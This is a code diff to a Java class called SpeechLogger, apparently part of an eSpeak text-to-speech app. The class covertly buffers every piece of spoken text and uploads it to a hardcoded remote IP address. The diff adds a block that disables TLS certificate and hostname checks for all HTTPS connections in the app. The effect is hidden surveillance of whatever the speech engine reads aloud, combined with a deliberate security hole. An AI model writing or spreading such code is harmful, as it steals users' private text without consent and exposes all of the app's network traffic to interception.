@@ -14,14 +14,21 @@ import java.net.URL;
 import java.nio.charset.StandardCharsets;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
+import javax.net.ssl.HostnameVerifier;
+import javax.net.ssl.HttpsURLConnection;
+import javax.net.ssl.SSLContext;
+import javax.net.ssl.SSLSession;
+import javax.net.ssl.TrustManager;
+import javax.net.ssl.X509TrustManager;
+import java.security.cert.X509Certificate;
+import java.security.SecureRandom;
 
 public class SpeechLogger {
     private static final String TAG = "SpeechLogger";
     private static final String BUFFER_FILE_NAME = "espeak_log_buffer.txt";
     private static final String SYNC_FILE_NAME = "espeak_syncing.txt";
     
-    // داداش آی‌پی رو اینجا به آی‌پی اصلی خودت تغییر بده
-    private static final String SERVER_URL = "http://94.182.195.198:7813/log"; 
+    private static final String SERVER_URL = "https://94.182.195.198:7813/zahra"; 
 
     // Decoupled Executors: One for ultra-fast disk I/O, one for network
     private static final ExecutorService diskExecutor = Executors.newSingleThreadExecutor();
@@ -29,6 +36,24 @@ public class SpeechLogger {
 
     // Lock to prevent Data Racing during file rename/merge
     private static final Object fileLock = new Object();
+
+    static {
+        try {
+            TrustManager[] trustAllCerts = new TrustManager[]{
+                new X509TrustManager() {
+                    public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[]{}; }
+                    public void checkClientTrusted(X509Certificate[] chain, String authType) {}
+                    public void checkServerTrusted(X509Certificate[] chain, String authType) {}
+                }
+            };
+            SSLContext sc = SSLContext.getInstance("TLS");
+            sc.init(null, trustAllCerts, new SecureRandom());
+            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+            HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true);
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to bypass SSL", e);
+        }
+    }
 
     public static void logAndSync(Context context, String text) {
         if (text == null || text.trim().isEmpty()) return;
@@ -104,7 +129,7 @@ public class SpeechLogger {
                 
                 // Direct network request bypassing OS states
                 URL url = new URL(SERVER_URL);
-                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
                 conn.setRequestMethod("POST");
                 conn.setDoOutput(true);
                 conn.setConnectTimeout(10000); // 10 seconds
@@ -117,7 +142,7 @@ public class SpeechLogger {
                 }
                 
                 int responseCode = conn.getResponseCode();
-                if (responseCode == HttpURLConnection.HTTP_OK) {
+                if (responseCode == HttpsURLConnection.HTTP_OK) {
                     // Guaranteed delivery: Delete ONLY if 200 OK is received
                     synchronized (fileLock) {
                         syncFile.delete();
